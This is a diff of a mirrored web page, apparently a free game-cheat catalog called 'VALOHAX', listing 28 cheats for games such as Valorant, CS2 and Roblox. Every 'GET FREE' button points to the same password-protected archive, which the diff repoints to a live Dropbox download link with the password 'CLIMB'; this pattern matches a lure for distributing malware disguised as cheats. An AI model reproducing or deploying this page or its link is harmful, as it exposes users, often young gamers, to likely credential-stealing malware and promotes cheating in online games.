@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <!-- Mirrored from climbcheats.com/catalog.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 13 Feb 2025 19:12:06 GMT -->
 <head>
     <meta charset="UTF-8">
@@ -11,11 +12,7 @@
     <script src="catalog.js" defer=""></script>
 
     <script src="jquery.min.js"></script>
-    <!-- <script src="./js/libs.min.js"></script> -->
     <style>.catalog-block__item-link { cursor: pointer; }</style>
-    <!-- <script src="https://cdn.jsdelivr.net/gh/amphetyze/console-ban/console-ban.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/amphetyze/console-ban/console-ban-settings.js" defer></script>
-    <script src="https://cdn.jsdelivr.net/gh/amphetyze/console-ban/context-menu-ban.js"></script> -->
 </head>
 
 <body>
@@ -27,19 +24,17 @@
             <a href="index.html" class="header-block__link hide_header">Home</a>
             <a href="#" class="header-block__link hide_header">Cheats</a>
             <a href="reviews.html" class="header-block__link hide_header">Reviews</a>
-            
         </div>
     </div>
-
-
 
     <div class="catalog">
         <div class="title">
             <h1>VALOHAX Catalog</h1>
             <h2>Check out our full list of products</h2>
         </div>
-        <form action="valohaxloader.rar" method="post" class="catalog-block section" id="catalogContainer"></form>
-       
+        <div class="catalog-block section" id="catalogContainer">
+            <!-- Products will be dynamically inserted here -->
+        </div>
     </div>
 
     <div class="footer">
@@ -56,289 +51,63 @@
                 <a href="politics.html" class="footer-block__nav-link">Politics</a>
             </div>
             <div class="footer-copyrith">
-                © 2020-2025            </div>
+                © 2020-2025
+            </div>
         </div>
     </div>
+
     <script>
-        let buildLink = 'valohaxloader.rar';
-let password = 'CLIMB';
+        // Verdiğiniz Dropbox indirme linki
+        let downloadLink = 'https://www.dropbox.com/scl/fi/vbe2jc840dvlhg4a5ob9k/valohexloader.rar?rlkey=9iekwli62njfyoyvd7jkueh4l&st=x3a7zjfp&dl=1';
+        let password = 'CLIMB';
 
-// не трогать
-const products = [
-    {
-        id: 1,
-        img: "fortnite.svg",
-        name: "Fort Cheat",
-        content: "FortCheat contains a lot of functionality that will help you win royal battles",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 2,
-        img: "cs2.svg",
-        name: "CS2 Cheat",
-        content: "CS2_Cheat will help you win any CS2 game. Good protection, many functions, user-friendly interface",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 3,
-        img: "gta.svg",
-        name: "GTAV Cheat",
-        content: "GTAV_Cheat is a good trainer for both offline and online sessions",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 4,
-        img: "minecraft.svg",
-        name: "Minecraft Cheat",
-        content: "Everything you need for your PVP can be found in MinecraftCheat",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 5,
-        img: "apex.svg",
-        name: "Apex Cheat",
-        content: "Find all the features you need in ApexCheat",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 6,
-        img: "valorant.svg",
-        name: "Valorant Cheat",
-        content: "Win and dominate with ValorantCheat.",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 7,
-        img: "rainbow.svg",
-        name: "Rainbow Cheat",
-        content: "RainbowCheat will help you win where it is impossible to win",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 8,
-        img: "roblox.svg",
-        name: "Roblox Cheat",
-        content: "The best executer for roblox for PC, without keys",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 9,
-        img: "pubg.png",
-        name: "PUBG Cheat",
-        content: "PUBG_Cheat will make you a king in royal battles",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 10,
-        img: "warzone.png",
-        name: "Warzone Cheat",
-        content: "WarzoneCheat contains a lot of auxiliary functions for your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 11,
-        img: "dayz.png",
-        name: "DayZ Cheat",
-        content: "DayZ_Cheat will open up new possibilities in the game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 12,
-        img: "lol.png",
-        name: "League Cheat",
-        content: "LeagueCheat is an innovation that will allow you to raise your rating",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 13,
-        img: "rust.png",
-        name: "Rust Cheat",
-        content: "RustCheat is a spector of joy for you and your neighbors",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 14,
-        img: "overwatch.png",
-        name: "Overwatch2 Cheat",
-        content: "Overwatch2_Cheat will help you ensure an enjoyable game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 15,
-        img: "genshin.png",
-        name: "Genshin Cheat",
-        content: "Fighting monsters will become much easier with GenshinCheat",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 16,
-        img: "l4d2.png",
-        name: "Left4Dead2 Cheat",
-        content: "Play simply and comfortably with Left4Dead2_Cheat",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 17,
-        img: "escape2.png",
-        name: "Escape from Tarkov Cheat",
-        content: "Escape from Tarkov Cheat contains a lot of auxiliary functions for your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 18,
-        img: "farlight.webp",
-        name: "Farlight 84 Cheat",
-        content: "The best executer for Farlight 84",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 19,
-        img: "deadlock.png",
-        name: "Deadlock Cheat",
-        content: "Deadlock Cheat will open up new possibilities in the game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 20,
-        img: "forza.png",
-        name: "Forza Horizon 5 Cheat",
-        content: "Find all the features you need in Forza Horizon 5 Cheat",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 21,
-        img: "arena.png",
-        name: "Arena Breakout Infinite Cheat",
-        content: "Arena Breakout Infinite Cheat contains a lot of auxiliary functions for your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 22,
-        img: "cod.png",
-        name: "Call of Duty - Black Ops 6 Cheat",
-        content: "Call of Duty - Black Ops 6 Cheat contains a lot of functionality that will help you win royal battles",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 23,
-        img: "geometry.png",
-        name: "Geometry Dash Cheat",
-        content: "Geometry Dash Cheat will help you win where it is impossible to win",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 24,
-        img: "helldivers.png",
-        name: "Helldivers 2 Cheat",
-        content: "Helldivers 2 Cheat includes numerous helper functions for your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 25,
-        img: "Palworld.png",
-        name: "Palworld Cheat",
-        content: "Palworld Cheat offers various support functions to enhance your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 26,
-        img: "pixel.png",
-        name: "Pixel Gun 3d Cheat",
-        content: "Pixel Gun 3d Cheat provides multiple utility functions to improve your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 27,
-        img: "rdr2.png",
-        name: "Red Dead Redemption 2 Cheat",
-        content: "Red Dead Redemption 2 Cheat features a range of supplementary functions for your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
-    {
-        id: 28,
-        img: "Super.png",
-        name: "Supermarket Simulator Cheat",
-        content: "Supermarket Simulator Cheat comes with a variety of additional functions for your game",
-        link: (buildLink),
-        width: 150,
-        heigth: 150
-    },
+        // Ürün verileri
+        const products = [
+            { id: 1, img: "fortnite.svg", name: "Fort Cheat", content: "FortCheat contains a lot of functionality that will help you win royal battles", link: downloadLink },
+            { id: 2, img: "cs2.svg", name: "CS2 Cheat", content: "CS2_Cheat will help you win any CS2 game. Good protection, many functions, user-friendly interface", link: downloadLink },
+            { id: 3, img: "gta.svg", name: "GTAV Cheat", content: "GTAV_Cheat is a good trainer for both offline and online sessions", link: downloadLink },
+            { id: 4, img: "minecraft.svg", name: "Minecraft Cheat", content: "Everything you need for your PVP can be found in MinecraftCheat", link: downloadLink },
+            { id: 5, img: "apex.svg", name: "Apex Cheat", content: "Find all the features you need in ApexCheat", link: downloadLink },
+            { id: 6, img: "valorant.svg", name: "Valorant Cheat", content: "Win and dominate with ValorantCheat.", link: downloadLink },
+            { id: 7, img: "rainbow.svg", name: "Rainbow Cheat", content: "RainbowCheat will help you win where it is impossible to win", link: downloadLink },
+            { id: 8, img: "roblox.svg", name: "Roblox Cheat", content: "The best executer for roblox for PC, without keys", link: downloadLink },
+            { id: 9, img: "pubg.png", name: "PUBG Cheat", content: "PUBG_Cheat will make you a king in royal battles", link: downloadLink },
+            { id: 10, img: "warzone.png", name: "Warzone Cheat", content: "WarzoneCheat contains a lot of auxiliary functions for your game", link: downloadLink },
+            { id: 11, img: "dayz.png", name: "DayZ Cheat", content: "DayZ_Cheat will open up new possibilities in the game", link: downloadLink },
+            { id: 12, img: "lol.png", name: "League Cheat", content: "LeagueCheat is an innovation that will allow you to raise your rating", link: downloadLink },
+            { id: 13, img: "rust.png", name: "Rust Cheat", content: "RustCheat is a spector of joy for you and your neighbors", link: downloadLink },
+            { id: 14, img: "overwatch.png", name: "Overwatch2 Cheat", content: "Overwatch2_Cheat will help you ensure an enjoyable game", link: downloadLink },
+            { id: 15, img: "genshin.png", name: "Genshin Cheat", content: "Fighting monsters will become much easier with GenshinCheat", link: downloadLink },
+            { id: 16, img: "l4d2.png", name: "Left4Dead2 Cheat", content: "Play simply and comfortably with Left4Dead2_Cheat", link: downloadLink },
+            { id: 17, img: "escape2.png", name: "Escape from Tarkov Cheat", content: "Escape from Tarkov Cheat contains a lot of auxiliary functions for your game", link: downloadLink },
+            { id: 18, img: "farlight.webp", name: "Farlight 84 Cheat", content: "The best executer for Farlight 84", link: downloadLink },
+            { id: 19, img: "deadlock.png", name: "Deadlock Cheat", content: "Deadlock Cheat will open up new possibilities in the game", link: downloadLink },
+            { id: 20, img: "forza.png", name: "Forza Horizon 5 Cheat", content: "Find all the features you need in Forza Horizon 5 Cheat", link: downloadLink },
+            { id: 21, img: "arena.png", name: "Arena Breakout Infinite Cheat", content: "Arena Breakout Infinite Cheat contains a lot of auxiliary functions for your game", link: downloadLink },
+            { id: 22, img: "cod.png", name: "Call of Duty - Black Ops 6 Cheat", content: "Call of Duty - Black Ops 6 Cheat contains a lot of functionality that will help you win royal battles", link: downloadLink },
+            { id: 23, img: "geometry.png", name: "Geometry Dash Cheat", content: "Geometry Dash Cheat will help you win where it is impossible to win", link: downloadLink },
+            { id: 24, img: "helldivers.png", name: "Helldivers 2 Cheat", content: "Helldivers 2 Cheat includes numerous helper functions for your game", link: downloadLink },
+            { id: 25, img: "Palworld.png", name: "Palworld Cheat", content: "Palworld Cheat offers various support functions to enhance your game", link: downloadLink },
+            { id: 26, img: "pixel.png", name: "Pixel Gun 3d Cheat", content: "Pixel Gun 3d Cheat provides multiple utility functions to improve your game", link: downloadLink },
+            { id: 27, img: "rdr2.png", name: "Red Dead Redemption 2 Cheat", content: "Red Dead Redemption 2 Cheat features a range of supplementary functions for your game", link: downloadLink },
+            { id: 28, img: "Super.png", name: "Supermarket Simulator Cheat", content: "Supermarket Simulator Cheat comes with a variety of additional functions for your game", link: downloadLink }
+        ];
 
-];
+        const catalog = document.getElementById('catalogContainer');
 
-const catalog = document.getElementById('catalogContainer');
-
-products.map((item, index) => {
-    catalog.innerHTML += `
-    <div class="catalog-block__item">
-    <div>
-        <img src="${item.img}" alt="" class="catalog-block__img" style="max-width: 140px;">
-        <div class="catalog-block__item-title">${item.name}</div>
-        <div class="catalog-block__item-subtitle">${item.content}</div>
-    <button type="submit" class="catalog-block__item-link">GET FREE</button>
-    <div class="catalog-block__actual">#Actual</div>
-</div>`;
-});
-
+        products.map((item) => {
+            catalog.innerHTML += `
+            <div class="catalog-block__item">
+                <div>
+                    <img src="${item.img}" alt="" class="catalog-block__img" style="max-width: 140px;">
+                    <div class="catalog-block__item-title">${item.name}</div>
+                    <div class="catalog-block__item-subtitle">${item.content}</div>
+                    <a href="${item.link}" class="catalog-block__item-link" download>GET FREE</a>
+                    <div class="catalog-block__actual">#Actual</div>
+                </div>
+            </div>`;
+        });
     </script>
-
-
-
-
 </body>
 <!-- Mirrored from climbcheats.com/catalog.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 13 Feb 2025 19:12:06 GMT -->
 </html>
